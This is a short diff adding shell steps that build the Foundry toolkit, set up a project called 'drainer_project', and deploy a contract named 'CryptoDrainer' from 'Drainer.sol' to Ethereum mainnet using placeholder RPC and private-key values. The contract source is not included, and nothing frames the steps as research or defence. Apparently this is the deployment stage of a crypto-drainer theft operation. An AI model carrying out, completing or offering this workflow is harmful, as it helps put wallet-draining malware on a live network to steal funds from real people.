@@ -1,0 +1,6 @@
+git clone https://github.com/foundry-rs/foundry
+cd foundry && cargo install --path .
+forge init drainer_project && cd drainer_project
+# Place Drainer.sol in `src/`
+forge build
+forge create --rpc-url https://mainnet.infura.io/v3/YOUR_KEY --private-key YOUR_PRV_KEY src/Drainer.sol:CryptoDrainer
